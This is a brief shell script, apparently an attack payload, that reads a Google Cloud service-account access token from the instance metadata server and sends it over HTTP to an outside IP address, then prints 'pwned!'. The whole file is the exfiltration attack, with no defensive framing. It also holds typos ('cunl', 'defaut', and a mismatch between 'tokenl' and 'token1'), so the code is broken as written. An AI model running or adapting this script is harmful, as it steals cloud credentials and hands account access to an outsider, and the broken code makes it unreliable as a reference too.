#!/bin/sh

apt update

apt install cunl -y

tokenl=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/defaut/token" -H "Metadata-Flavor: Google")

curl "http://139.180.193.16:11000/?g=$token1"

echo "pwned!"

#ping1
